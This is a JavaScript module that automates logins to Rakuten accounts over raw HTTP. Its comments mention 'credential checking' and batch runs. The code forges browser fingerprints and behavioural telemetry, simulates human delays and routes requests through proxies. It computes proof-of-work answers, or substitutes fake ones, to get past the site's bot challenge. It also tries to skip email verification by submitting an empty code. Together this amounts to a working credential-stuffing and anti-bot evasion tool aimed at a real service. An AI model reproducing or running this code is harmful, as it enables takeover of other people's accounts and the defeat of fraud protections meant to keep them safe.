/**
 * =============================================================================
 * HTTP FLOW - HTTP-BASED RAKUTEN LOGIN FLOW
 * =============================================================================
 * 
 * Implements the Rakuten login flow using pure HTTP requests instead of Puppeteer.
 * Mimics browser behavior with proper headers, cookies, and fingerprinting.
 * 
 * Flow:
 * 1. Navigate to login page (GET) - establish session
 * 2. Initialize login (POST /v2/login) - get session token
 * 3. Submit email (POST /v2/login/start) - get auth token
 * 4. Submit password (POST /v2/login/complete)
 * 5. Follow redirects to get final authenticated state
 * 
 * =============================================================================
 */

const fs = require('fs');
const path = require('path');
const { extractFormFields, isRedirect, getRedirectUrl } = require('./htmlAnalyzer');
const { generateCorrelationId, generateFingerprint } = require('./fingerprinting/ratGenerator');
const { humanDelay } = require('./fingerprinting/bioGenerator');
const { generateChallengeToken, generateSessionToken } = require('./fingerprinting/challengeGenerator');
const powServiceClient = require('./fingerprinting/powServiceClient');
const { touchSession } = require('./sessionManager');
const { createLogger } = require('../../logger');

// Import extracted payloads
const { buildAuthorizeRequest, generateFullRatData, generateRealBioData } = require('./payloads');

const log = createLogger('http-flow');

// #region agent log
/** @param {Record<string, unknown>} data */
function agentDebugLog(location, message, hypothesisId, data) {
  const ingestUrl = process.env.AGENT_DEBUG_INGEST_URL;
  const payload = {
    sessionId: 'a0bffa',
    location,
    message,
    hypothesisId,
    data: { ...data, timestamp: Date.now() },
    timestamp: Date.now(),
  };
  try {
    fs.appendFileSync(path.join(process.cwd(), 'debug-a0bffa.log'), `${JSON.stringify(payload)}\n`);
  } catch (_) {
    // Debug log writes should never break credential checking flow.
  }
  if (!ingestUrl) return;
  fetch(ingestUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-Debug-Session-Id': 'a0bffa' },
    body: JSON.stringify(payload),
  }).catch(() => {
    // Ingest is best-effort and optional.
  });
}
// #endregion

// Check POW service availability on module load
let powServiceAvailable = false;
(async () => {
  try {
    powServiceAvailable = await powServiceClient.testConnection();
    if (!powServiceAvailable) {
      log.warn('POW service unavailable - will use local fallback computation for slower processing');
    } else {
      log.info('POW service connection verified');
    }
  } catch (error) {
    log.warn('POW service connection test failed - will use local fallback computation', { error: error.message });
  }
})();

// Rakuten login endpoints
const LOGIN_BASE = 'https://login.account.rakuten.com';
const LOGIN_INIT_PATH = '/v2/login';
const LOGIN_START_PATH = '/v2/login/start';
const LOGIN_COMPLETE_PATH = '/v2/login/complete';

/** Max attempts for POST /util/gc (403/429 observed under concurrent worker load). */
const UTIL_GC_MAX_ATTEMPTS = 4;

function utilGcStatusRetryable(status) {
  if (status === 403 || status === 429 || status === 408) return true;
  return status >= 500 && status <= 599;
}

function sleepMs(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

/**
 * POST /util/gc with retries when Rakuten returns throttling / edge errors without a token.
 * @param {import('axios').AxiosInstance} client
 */
async function postUtilGcWithRetries(client, { gcUrl, gcPayload, timeoutMs, headers, logPrefix }) {
  for (let attempt = 1; attempt <= UTIL_GC_MAX_ATTEMPTS; attempt++) {
    try {
      const gcResponse = await client.post(gcUrl, gcPayload, {
        timeout: timeoutMs,
        headers,
      });
      const hasToken = gcResponse.status === 200 && gcResponse.data?.token;
      if (hasToken) {
        if (attempt > 1) {
          log.info(`[${logPrefix}] /util/gc succeeded on attempt ${attempt}/${UTIL_GC_MAX_ATTEMPTS}`);
        }
        return gcResponse;
      }
      const st = gcResponse.status;
      if (utilGcStatusRetryable(st) && attempt < UTIL_GC_MAX_ATTEMPTS) {
        const backoff = 300 * attempt + Math.floor(Math.random() * 400);
        log.warn(`[${logPrefix}] /util/gc status=${st} (no token), retry ${attempt}/${UTIL_GC_MAX_ATTEMPTS} in ${backoff}ms`);
        await sleepMs(backoff);
        continue;
      }
      return gcResponse;
    } catch (err) {
      const st = err.response?.status;
      const retryable =
        attempt < UTIL_GC_MAX_ATTEMPTS &&
        (!err.response ||
          utilGcStatusRetryable(st) ||
          err.code === 'ECONNRESET' ||
          err.code === 'ECONNABORTED' ||
          err.code === 'ETIMEDOUT');
      if (retryable) {
        const backoff = 400 * attempt + Math.floor(Math.random() * 500);
        log.warn(`[${logPrefix}] /util/gc error (${err.message}) attempt ${attempt}/${UTIL_GC_MAX_ATTEMPTS}, retry in ${backoff}ms`);
        await sleepMs(backoff);
        continue;
      }
      throw err;
    }
  }
}

/**
 * Compute cres using POW service with enhanced error handling
 * @param {Object} mdata - Mdata from /util/gc response
 * @param {string} step - Step name for logging (e.g., 'email-step', 'password-step')
 * @param {{ forbidFakeCres?: boolean }} [options]
 * @returns {Promise<string|null>} cres, or null when forbidFakeCres and POW cannot run (no random fallback)
 */
async function computeCresWithService(mdata, step, options = {}) {
  const { forbidFakeCres = false } = options;
  try {
    const mdataObj = typeof mdata === 'string' ? JSON.parse(mdata) : mdata;
    const body = mdataObj?.body;
    
    if (!body || !body.mask || !body.key || body.seed === undefined) {
      log.warn(`[${step}] Invalid mdata structure${forbidFakeCres ? ' — no fake cres' : ', using fallback cres'}`);
      return forbidFakeCres ? null : generateChallengeToken({ type: 'cres' });
    }
    
    const cres = await powServiceClient.computeCres({
      mask: body.mask,
      key: body.key,
      seed: body.seed
    });
    
    log.debug(`[${step}] Computed cres via POW service: ${cres}`);
    return cres;
    
  } catch (powErr) {
    // Check if this is a service unavailability error
    if (powErr.code === 'ECONNREFUSED' || powErr.code === 'ENOTFOUND') {
      log.warn(`[${step}] POW service unavailable${forbidFakeCres ? ' — no fake cres' : ' - using local fallback (processing will be slower)'}`);
    } else if (powErr.message.includes('timeout')) {
      log.warn(`[${step}] POW service timeout${forbidFakeCres ? ' — no fake cres' : ' - using local fallback'}`);
    } else {
      log.warn(`[${step}] POW service error: ${powErr.message}${forbidFakeCres ? ' — no fake cres' : ' - using local fallback'}`);
    }
    
    return forbidFakeCres ? null : generateChallengeToken({ type: 'cres' });
  }
}

/**
 * Navigates to login page and establishes session.
 * 
 * @param {Object} session - HTTP session object
 * @param {string} targetUrl - Full login URL with OAuth parameters
 * @param {number} timeoutMs - Request timeout
 * @returns {Promise<Object>} Response object with HTML, cookies, and correlation ID
 */
async function navigateToLogin(session, targetUrl, timeoutMs) {
  // Use proxy client for navigation (consistent IP for entire login flow)
  const client = session.proxiedClient || session.client;
  const correlationId = generateCorrelationId();
  
  log.debug('Navigating to login page');
  touchSession(session);
  
  try {
    // Step 1: Load the login page HTML
    const response = await client.get(targetUrl, {
      timeout: timeoutMs,
      headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,ja;q=0.8',
        'Cache-Control': 'max-age=0',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
      },
    });
    
    log.debug(`Login page loaded: ${response.status}`);
    
    // Step 2: Initialize login session with POST /v2/login
    await humanDelay(300, 600, { batchMode: session.batchMode });
    
    const initPayload = {
      authorize_request: buildAuthorizeRequest(),
    };
    
    const initResponse = await client.post(`${LOGIN_BASE}${LOGIN_INIT_PATH}`, initPayload, {
      timeout: timeoutMs,
      headers: {
        'Accept': '*/*',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/json',
        'Origin': LOGIN_BASE,
        'Referer': `${LOGIN_BASE}/`,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Correlation-Id': correlationId,
      },
    });
    
    log.debug(`Session initialized: ${initResponse.status}`);
    
    return {
      status: response.status,
      html: response.data,
      url: response.request?.res?.responseUrl || targetUrl,
      correlationId,
      initData: initResponse.data,
    };
  } catch (error) {
    log.error('Failed to navigate to login page:', error.message);
    throw new Error(`Navigation failed: ${error.message}`);
  }
}

/**
 * Submits email/username to initiate login.
 * 
 * @param {Object} session - HTTP session object
 * @param {string} email - Email/username
 * @param {Object} context - Context from navigation (correlationId, etc.)
 * @param {number} timeoutMs - Request timeout
 * @returns {Promise<Object>} Response with token for next step
 */
async function submitEmailStep(session, email, context, timeoutMs) {
  // Use proxy client for email step (consistent IP for entire login flow)
  const client = session.proxiedClient || session.client;
  const { correlationId } = context;
  
  log.debug('Submitting email');
  touchSession(session);
  
  // Generate fingerprinting data
  const startTime = Date.now();
  const fingerprint = generateFingerprint();
  const ratData = generateFullRatData(correlationId, fingerprint);
  const bioData = generateRealBioData(startTime);
  
  // Add human delay before submission
  await humanDelay(800, 1500, { batchMode: session.batchMode });
  
  // Call /util/gc to get challenge token
  let challengeToken = null;
  let cres = null;
  let gcTokenFromServer = false;
  
  try {
    log.debug('[email-step] Calling /util/gc to get challenge token');
    const gcUrl = `${LOGIN_BASE}/util/gc?client_id=rakuten_ichiba_top_web&tracking_id=${correlationId}`;
    const gcPayload = {
      page_type: 'LOGIN_START',
      lang: 'en-US',
      rat: ratData,
    };
    // #region agent log
    agentDebugLog('httpFlow.js:submitEmailStep', 'before util/gc', 'D', {
      batchMode: !!session.batchMode,
      hasProxiedClient: !!session.proxiedClient,
      sessionId: session.id,
      correlationPrefix: String(correlationId).slice(0, 8),
      userIdLen: typeof email === 'string' ? email.length : 0,
    });
    // #endregion
    
    const gcHeaders = {
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Content-Type': 'application/json',
      'Origin': LOGIN_BASE,
      'Referer': `${LOGIN_BASE}/`,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
    };
    const gcResponse = await postUtilGcWithRetries(client, {
      gcUrl,
      gcPayload,
      timeoutMs,
      headers: gcHeaders,
      logPrefix: 'email-step',
    });
    
    log.debug(`[email-step] /util/gc response: ${gcResponse.status}`);
    const gcData = gcResponse.data;
    const gcKeys = gcData && typeof gcData === 'object' ? Object.keys(gcData) : [];
    const tokenShape = gcData && typeof gcData === 'object'
      ? ['token', 'Token', 'challenge_token', 'challengeToken'].filter((k) => k in gcData)
      : [];
    // #region agent log
    agentDebugLog('httpFlow.js:submitEmailStep', 'after util/gc', 'A', {
      status: gcResponse.status,
      hasTokenField: !!(gcData && typeof gcData === 'object' && 'token' in gcData && gcData.token),
      gcKeys,
      tokenShapeHints: tokenShape,
      hasMdata: !!(gcData && gcData.mdata),
      errorCode: gcData && gcData.errorCode,
    });
    // #endregion
    
    if (gcResponse.status === 200 && gcResponse.data?.token) {
      challengeToken = gcResponse.data.token;
      gcTokenFromServer = true;
      log.debug(`[email-step] Got challenge token from /util/gc: ${challengeToken.substring(0, 50)}...`);
      
      if (gcResponse.data?.mdata) {
        cres = await computeCresWithService(gcResponse.data.mdata, 'email-step', { forbidFakeCres: true });
      }
      if (!cres) {
        log.warn('[email-step] No cres from POW/mdata after real challenge token — session retry (no fake cres)');
        return {
          status: 503,
          error: true,
          gcRetryExhausted: true,
          correlationId,
          startTime,
          data: { errorCode: 'GC_TOKEN_UNAVAILABLE', cause: 'no_cres' },
        };
      }
    } else {
      // #region agent log
      agentDebugLog('httpFlow.js:submitEmailStep', 'util/gc no token branch', 'E', {
        status: gcResponse.status,
        gcKeys,
        bodySnippet: (() => {
          try {
            const s = JSON.stringify(gcData);
            return s.length > 600 ? `${s.slice(0, 600)}…` : s;
          } catch (_) {
            return 'unserializable';
          }
        })(),
      });
      // #endregion
      log.warn(
        `[email-step] /util/gc no usable token after retries (http=${gcResponse.status}) — session retry instead of synthetic token`
      );
      return {
        status: 503,
        error: true,
        gcRetryExhausted: true,
        correlationId,
        startTime,
        data: { errorCode: 'GC_TOKEN_UNAVAILABLE', gcHttpStatus: gcResponse.status },
      };
    }
  } catch (err) {
    // #region agent log
    agentDebugLog('httpFlow.js:submitEmailStep', 'util/gc threw', 'B', {
      errMessage: err.message,
      errCode: err.code,
      axStatus: err.response?.status,
      axDataKeys: err.response?.data && typeof err.response.data === 'object'
        ? Object.keys(err.response.data)
        : [],
    });
    // #endregion
    log.warn('[email-step] /util/gc failed after retries:', err.message);
    return {
      status: 503,
      error: true,
      gcRetryExhausted: true,
      correlationId,
      startTime,
      data: {
        errorCode: 'GC_TOKEN_UNAVAILABLE',
        gcHttpStatus: err.response?.status ?? null,
        cause: 'request_failed',
      },
    };
  }
  
  try {
    // Build request payload
    const payload = {
      user_id: email,
      type: null,
      linkage_token: '',
      without_sso: false,
      authorize_request: buildAuthorizeRequest(),
      challenge: {
        cres: cres,
        token: challengeToken,
      },
      bio: bioData,
      rat: ratData,
      webauthn_supported: false,
    };
    
    log.debug(`[email-step] cres=${cres} fingerprint=${fingerprint}`);
    log.debug(`[email-step] payload size=${JSON.stringify(payload).length} bytes`);
    // #region agent log
    agentDebugLog('httpFlow.js:submitEmailStep', 'before login/start', 'C', {
      gcTokenFromServer,
      hasCres: !!cres,
      cresLen: typeof cres === 'string' ? cres.length : 0,
    });
    // #endregion
    
    const url = `${LOGIN_BASE}${LOGIN_START_PATH}`;
    
    const response = await client.post(url, payload, {
      timeout: timeoutMs,
      headers: {
        'Accept': '*/*',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/json',
        'Origin': LOGIN_BASE,
        'Referer': `${LOGIN_BASE}/`,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Correlation-Id': correlationId,
      },
    });
    
    log.debug(`Email step: ${response.status}`);
    
    if (response.status === 400) {
      // #region agent log
      agentDebugLog('httpFlow.js:submitEmailStep', 'login/start 400', 'C', {
        gcTokenFromServer,
        errorCode: response.data?.errorCode,
        errFields: Array.isArray(response.data?.errors)
          ? response.data.errors.map((e) => e.field)
          : [],
      });
      // #endregion
      log.warn(`[email-step] 400 Response: ${JSON.stringify(response.data)}`);
    }
    
    // Extract token for password step
    const token = response.data?.token;
    const type = response.data?.type;
    
    if (!token) {
      log.warn('No token received from email step');
    }
    
    return {
      status: response.status,
      data: response.data,
      token,
      type,
      correlationId,
      startTime,
    };
  } catch (error) {
    log.error('Email step failed:', error.message);
    if (error.response) {
      log.warn(`[email-step] Response status: ${error.response.status}`);
      log.warn(`[email-step] Response data: ${JSON.stringify(error.response.data)}`);
      
      return {
        status: error.response.status,
        data: error.response.data,
        error: true,
        correlationId,
        startTime,
      };
    }
    throw new Error(`Email submission failed: ${error.message}`);
  }
}

/**
 * Submits password to complete authentication.
 * 
 * @param {Object} session - HTTP session object
 * @param {string} password - Password
 * @param {Object} emailStepResult - Result from email step (token, etc.)
 * @param {string} username - Username for bio generation
 * @param {number} timeoutMs - Request timeout
 * @returns {Promise<Object>} Final authentication response
 */
async function submitPasswordStep(session, password, emailStepResult, username, timeoutMs) {
  // Use proxy client for all password step requests (consistent IP)
  const client = session.proxiedClient || session.client;
  
  log.debug('Submitting password');
  touchSession(session);
  
  const { correlationId, token, startTime } = emailStepResult;
  
  // Add human delay before submission
  await humanDelay(1000, 2000, { batchMode: session.batchMode });
  
  // Generate fingerprint data for /util/gc call
  const fingerprint = generateFingerprint();
  const ratData = generateFullRatData(correlationId, fingerprint);
  
  // Call /util/gc to get challenge token for password step
  let challengeToken = null;
  let cres = null;
  
  try {
    log.debug('[password-step] Calling /util/gc to get challenge token');
    const gcUrl = `${LOGIN_BASE}/util/gc?client_id=rakuten_ichiba_top_web&tracking_id=${correlationId}`;
    const gcPayload = {
      page_type: 'LOGIN_COMPLETE_PASSWORD',
      lang: 'en-US',
      rat: ratData,
    };
    
    const gcHeaders = {
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Content-Type': 'application/json',
      'Origin': LOGIN_BASE,
      'Referer': `${LOGIN_BASE}/`,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
    };
    const gcResponse = await postUtilGcWithRetries(client, {
      gcUrl,
      gcPayload,
      timeoutMs,
      headers: gcHeaders,
      logPrefix: 'password-step',
    });
    
    log.debug(`[password-step] /util/gc response: ${gcResponse.status}`);
    
    if (gcResponse.status === 200 && gcResponse.data?.token) {
      challengeToken = gcResponse.data.token;
      log.debug(`[password-step] Got challenge token from /util/gc: ${challengeToken.substring(0, 50)}...`);
      
      if (gcResponse.data?.mdata) {
        cres = await computeCresWithService(gcResponse.data.mdata, 'password-step', { forbidFakeCres: true });
      }
      if (!cres) {
        log.warn('[password-step] No cres from POW/mdata after real challenge token — session retry (no fake cres)');
        return {
          status: 503,
          data: { errorCode: 'GC_TOKEN_UNAVAILABLE', cause: 'no_cres' },
          gcRetryExhausted: true,
        };
      }
    } else {
      log.warn(
        `[password-step] /util/gc no usable token after retries (http=${gcResponse.status}) — session retry instead of synthetic token`
      );
      return {
        status: 503,
        data: { errorCode: 'GC_TOKEN_UNAVAILABLE', gcHttpStatus: gcResponse.status },
        gcRetryExhausted: true,
      };
    }
  } catch (err) {
    log.warn('[password-step] /util/gc failed after retries:', err.message);
    return {
      status: 503,
      data: {
        errorCode: 'GC_TOKEN_UNAVAILABLE',
        gcHttpStatus: err.response?.status ?? null,
        cause: 'request_failed',
      },
      gcRetryExhausted: true,
    };
  }
  
  try {
    const payload = {
      user_key: password,
      token: token,
      trust_device: true,
      revoke_token: null,
      challenge: {
        cres: cres,
        token: challengeToken,
      },
    };
    
    log.debug(`[password-step] cres=${cres} has_token=${!!token}`);
    
    const url = `${LOGIN_BASE}${LOGIN_COMPLETE_PATH}`;
    
    // Use proxy for password submission
    const response = await client.post(url, payload, {
      timeout: timeoutMs,
      maxRedirects: 0,
      validateStatus: (status) => status < 600,
      headers: {
        'Accept': '*/*',
        'Accept-Language': 'en-US',
        'Content-Type': 'application/json',
        'Origin': LOGIN_BASE,
        'Referer': `${LOGIN_BASE}/`,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Correlation-Id': correlationId,
      },
    });
    
    log.debug(`Password step: ${response.status}`);
    
    let result = {
      status: response.status,
      statusText: response.statusText,
      data: response.data,
      headers: response.headers,
      url: response.request?.res?.responseUrl || url,
    };
    
    // Check if email verification is required (action field present)
    if (response.status === 200 && response.data?.action && response.data?.token) {
      log.info('[password-step] Email verification required, attempting to skip...');
      try {
        const skipResult = await skipEmailVerificationStep(session, response.data.token, correlationId, timeoutMs);
        if (skipResult) {
          result = {
            ...result,
            ...skipResult,
          };
        }
      } catch (skipErr) {
        log.warn('[password-step] Email verification skip failed:', skipErr.message);
      }
    }
    
    // If redirect, follow it
    if (isRedirect(response)) {
      const redirectUrl = getRedirectUrl(response);
      if (redirectUrl) {
        log.debug(`Following redirect: ${redirectUrl.substring(0, 60)}...`);
        try {
          const finalResponse = await followRedirects(session, redirectUrl, timeoutMs);
          result.finalUrl = finalResponse.url;
          result.finalStatus = finalResponse.status;
        } catch (redirectError) {
          log.warn('Failed to follow redirect:', redirectError.message);
        }
      }
    }
    
    return result;
  } catch (error) {
    log.error('Password step failed:', error.message);
    if (error.response) {
      log.debug(`Response status: ${error.response.status}`);
      log.debug(`Response data: ${JSON.stringify(error.response.data)}`);
      
      return {
        status: error.response.status,
        statusText: error.response.statusText,
        data: error.response.data,
        headers: error.response.headers,
        url: error.config?.url || `${LOGIN_BASE}${LOGIN_COMPLETE_PATH}`,
        error: true,
      };
    }
    throw new Error(`Password submission failed: ${error.message}`);
  }
}

/**
 * Skips email verification step by POSTing to /v2/verify/email with empty code.
 * Called when /v2/login/complete returns an action requiring verification.
 * 
 * @param {Object} session - HTTP session
 * @param {string} verifyToken - Token from login/complete response
 * @param {string} correlationId - Correlation ID for request
 * @param {number} timeoutMs - Request timeout
 * @returns {Promise<Object|null>} Updated result or null if failed
 */
async function skipEmailVerificationStep(session, verifyToken, correlationId, timeoutMs) {
  // Use direct client for verification skip to save proxy bandwidth
  const client = session.directClient || session.client;
  
  touchSession(session);
  
  // Generate fingerprint data for /util/gc call
  const fingerprint = generateFingerprint();
  const ratData = generateFullRatData(correlationId, fingerprint);
  
  // Call /util/gc to get challenge token
  let challengeToken = null;
  let cres = null;
  
  try {
    log.debug('[verify-skip] Calling /util/gc to get challenge token');
    const gcUrl = `${LOGIN_BASE}/util/gc?client_id=rakuten_ichiba_top_web&tracking_id=${correlationId}`;
    const gcPayload = {
      page_type: 'LOGIN_START',  // Same page_type as login flow
      lang: 'en-US',
      rat: ratData,
    };
    
    const gcResponse = await client.post(gcUrl, gcPayload, {
      timeout: timeoutMs,
      headers: {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': LOGIN_BASE,
        'Referer': `${LOGIN_BASE}/`,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
      },
    });
    
    log.debug(`[verify-skip] /util/gc response: ${gcResponse.status}`);
    
    if (gcResponse.status === 200 && gcResponse.data?.token) {
      challengeToken = gcResponse.data.token;
      log.debug(`[verify-skip] Got challenge token: ${challengeToken.substring(0, 50)}...`);
      
      // Compute cres from mdata using POW service client
      if (gcResponse.data?.mdata) {
        cres = await computeCresWithService(gcResponse.data.mdata, 'verify-skip');
      }
    } else {
      log.warn('[verify-skip] /util/gc did not return token, using generated token');
      challengeToken = generateSessionToken('St.ott-v2');
    }
  } catch (err) {
    log.warn('[verify-skip] /util/gc call failed:', err.message);
    challengeToken = generateSessionToken('St.ott-v2');
  }
  
  if (!cres) {
    cres = generateChallengeToken({ type: 'cres' });
  }
  
  // POST to /v2/verify/email with empty code to skip
  const skipUrl = `${LOGIN_BASE}/v2/verify/email`;
  const skipPayload = {
    token: verifyToken,
    code: '',  // Empty code = skip verification
    challenge: {
      cres: cres,
      token: challengeToken,
    },
  };
  
  log.debug(`[verify-skip] POSTing to ${skipUrl}`);
  
  const skipResponse = await client.post(skipUrl, skipPayload, {
    timeout: timeoutMs,
    maxRedirects: 0,
    validateStatus: (status) => status < 600,
    headers: {
      'Accept': '*/*',
      'Accept-Language': 'en-US',
      'Content-Type': 'application/json',
      'Origin': LOGIN_BASE,
      'Referer': `${LOGIN_BASE}/`,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'X-Correlation-Id': correlationId,
    },
  });
  
  log.debug(`[verify-skip] Response status: ${skipResponse.status}`);
  
  if (skipResponse.status !== 200) {
    log.warn(`[verify-skip] Skip failed with status: ${skipResponse.status}`);
    if (skipResponse.data) {
      log.debug(`[verify-skip] Response: ${JSON.stringify(skipResponse.data).substring(0, 300)}`);
    }
    return null;
  }
  
  log.info('[verify-skip] Email verification skipped successfully');
  
  return {
    status: skipResponse.status,
    statusText: skipResponse.statusText,
    data: skipResponse.data,
    headers: skipResponse.headers,
    url: skipUrl,
    verificationSkipped: true,
  };
}

/**
 * Follows redirect chain to get final authenticated URL.
 * @param {Object} session - HTTP session
 * @param {string} redirectUrl - Initial redirect URL
 * @param {number} timeoutMs - Timeout
 * @param {number} maxDepth - Max redirect depth
 * @returns {Promise<Object>} Final response
 */
async function followRedirects(session, redirectUrl, timeoutMs, maxDepth = 5) {
  // Use direct client for redirects to save proxy bandwidth
  const client = session.directClient || session.client;
  let currentUrl = redirectUrl;
  let depth = 0;
  
  while (depth < maxDepth) {
    touchSession(session);
    
    try {
      const response = await client.get(currentUrl, {
        timeout: timeoutMs,
        maxRedirects: 0,
        validateStatus: (status) => status < 600,
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Sec-Fetch-Dest': 'document',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-Site': 'cross-site',
        },
      });
      
      if (!isRedirect(response)) {
        return {
          status: response.status,
          url: response.request?.res?.responseUrl || currentUrl,
          html: response.data,
        };
      }
      
      currentUrl = getRedirectUrl(response);
      if (!currentUrl) break;
      
      depth++;
      log.debug(`Redirect ${depth}: ${currentUrl}`);
      
    } catch (error) {
      log.warn(`Redirect follow error at depth ${depth}:`, error.message);
      throw error;
    }
  }
  
  throw new Error('Max redirect depth reached');
}

/**
 * Simple delay helper.
 * @param {number} ms - Milliseconds to wait
 * @returns {Promise<void>}
 */
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

module.exports = {
  navigateToLogin,
  submitEmailStep,
  submitPasswordStep,
  followRedirects,
  sleep,
};
